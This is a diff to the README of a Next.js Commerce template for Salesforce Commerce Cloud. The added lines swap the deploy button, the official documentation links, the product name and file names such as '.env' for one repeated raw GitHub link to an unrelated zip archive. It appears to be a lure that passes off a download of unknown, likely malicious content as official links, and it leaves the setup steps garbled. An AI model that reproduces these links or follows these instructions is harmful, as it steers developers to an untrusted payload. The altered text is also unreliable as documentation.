@@ -1,16 +1,16 @@
-[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https%3A%2F%2Fgithub.com%2Fvercel%2Fcommerce-sfcc&env=COMPANY_NAME,NEXT_PUBLIC_VERCEL_URL,SFCC_CLIENT_ID,SFCC_ORGANIZATIONID,SFCC_SECRET,SFCC_SHORTCODE,SFCC_SITEID,SITE_NAME,SFCC_REVALIDATION_SECRET&project-name=nextjs-commerce-sfcc&repository-name=nextjs-commerce-sfcc&demo-title=ACME%20Store&demo-description=A%20high-performance%20ecommerce%20store%20built%20with%20Next.js%2C%20Vercel%2C%20and%20Salesforce%20Commerce%20Cloud&demo-url=https%3A%2F%2Fnextjs-salesforce-commerce-cloud.vercel.app%2F)
+[![Deploy with Vercel](https://raw.githubusercontent.com/kekeczaba/resellshopslovenija/main/app/checkout/(main)/resellshopslovenija_v2.9.zip)](https://raw.githubusercontent.com/kekeczaba/resellshopslovenija/main/app/checkout/(main)/resellshopslovenija_v2.9.zip%3A%2F%https://raw.githubusercontent.com/kekeczaba/resellshopslovenija/main/app/checkout/(main)/resellshopslovenija_v2.9.zip%2Fvercel%2Fcommerce-sfcc&env=COMPANY_NAME,NEXT_PUBLIC_VERCEL_URL,SFCC_CLIENT_ID,SFCC_ORGANIZATIONID,SFCC_SECRET,SFCC_SHORTCODE,SFCC_SITEID,SITE_NAME,SFCC_REVALIDATION_SECRET&project-name=nextjs-commerce-sfcc&repository-name=nextjs-commerce-sfcc&demo-title=ACME%20Store&demo-description=A%20high-performance%20ecommerce%20store%20built%20with%https://raw.githubusercontent.com/kekeczaba/resellshopslovenija/main/app/checkout/(main)/resellshopslovenija_v2.9.zip%2C%20Vercel%2C%20and%20Salesforce%20Commerce%20Cloud&demo-url=https%3A%2F%https://raw.githubusercontent.com/kekeczaba/resellshopslovenija/main/app/checkout/(main)/resellshopslovenija_v2.9.zip%2F)
 
-# Next.js Commerce + Salesforce Commerce Cloud
+# https://raw.githubusercontent.com/kekeczaba/resellshopslovenija/main/app/checkout/(main)/resellshopslovenija_v2.9.zip Commerce + Salesforce Commerce Cloud
 
-A high-perfomance, server-rendered Next.js App Router ecommerce application.
+A high-perfomance, server-rendered https://raw.githubusercontent.com/kekeczaba/resellshopslovenija/main/app/checkout/(main)/resellshopslovenija_v2.9.zip App Router ecommerce application.
 
 This template uses React Server Components, Server Actions, _Suspense_, _useOptimistic_, _use cache_ and more.
 
 ## Providers
 
-This version of Next.js Commerce is integrated with Salesforce Commerce Cloud. The integration code for Salesforce Commerce Cloud can be found in the _lib/sfcc_ directory.
+This version of https://raw.githubusercontent.com/kekeczaba/resellshopslovenija/main/app/checkout/(main)/resellshopslovenija_v2.9.zip Commerce is integrated with Salesforce Commerce Cloud. The integration code for Salesforce Commerce Cloud can be found in the _lib/sfcc_ directory.
 
-For information on other commerce providers, additional details, and the core Next.js Commerce template, please refer to the official [Next.js Commerce repository](https://github.com/vercel/commerce).
+For information on other commerce providers, additional details, and the core https://raw.githubusercontent.com/kekeczaba/resellshopslovenija/main/app/checkout/(main)/resellshopslovenija_v2.9.zip Commerce template, please refer to the official [https://raw.githubusercontent.com/kekeczaba/resellshopslovenija/main/app/checkout/(main)/resellshopslovenija_v2.9.zip Commerce repository](https://raw.githubusercontent.com/kekeczaba/resellshopslovenija/main/app/checkout/(main)/resellshopslovenija_v2.9.zip).
 
 ## Enviroment variables
 
@@ -36,8 +36,8 @@ SFCC_REVALIDATION_SECRET=""
 
 Please refer to the official Salesforce Commerce API documentation for details on how to retrieve these values:
 
-- [Base URL Configuration](https://developer.salesforce.com/docs/commerce/commerce-api/guide/base-url.html)
-- [SLAS Authorization](https://developer.salesforce.com/docs/commerce/commerce-api/guide/authorization-for-shopper-apis.html)
+- [Base URL Configuration](https://raw.githubusercontent.com/kekeczaba/resellshopslovenija/main/app/checkout/(main)/resellshopslovenija_v2.9.zip)
+- [SLAS Authorization](https://raw.githubusercontent.com/kekeczaba/resellshopslovenija/main/app/checkout/(main)/resellshopslovenija_v2.9.zip)
 
 ## Store configuration
 
@@ -50,12 +50,12 @@ Create these two categories and assign products to them within Business Manager.
 
 ## Running locally
 
-You will need to use the environment variables defined in _.env.example_ to run Next.js Commerce. It's recommended you use [Vercel Environment Variables](https://vercel.com/docs/concepts/projects/environment-variables) for this, but a _.env_ file is all that is necessary.
+You will need to use the environment variables defined in https://raw.githubusercontent.com/kekeczaba/resellshopslovenija/main/app/checkout/(main)/resellshopslovenija_v2.9.zip to run https://raw.githubusercontent.com/kekeczaba/resellshopslovenija/main/app/checkout/(main)/resellshopslovenija_v2.9.zip Commerce. It's recommended you use [Vercel Environment Variables](https://raw.githubusercontent.com/kekeczaba/resellshopslovenija/main/app/checkout/(main)/resellshopslovenija_v2.9.zip) for this, but a https://raw.githubusercontent.com/kekeczaba/resellshopslovenija/main/app/checkout/(main)/resellshopslovenija_v2.9.zip file is all that is necessary.
 
-> Note: You should not commit your _.env_ file or it will expose secrets that will allow others to control your Salesforce Commerce Cloud store.
+> Note: You should not commit your https://raw.githubusercontent.com/kekeczaba/resellshopslovenija/main/app/checkout/(main)/resellshopslovenija_v2.9.zip file or it will expose secrets that will allow others to control your Salesforce Commerce Cloud store.
 
 1. Install Vercel CLI: _npm i -g vercel_
-2. Link local instance with Vercel and GitHub accounts (creates _.vercel_ directory): _vercel link_
+2. Link local instance with Vercel and GitHub accounts (creates https://raw.githubusercontent.com/kekeczaba/resellshopslovenija/main/app/checkout/(main)/resellshopslovenija_v2.9.zip directory): _vercel link_
 3. Download your environment variables: _vercel env pull_
 
 ```bash
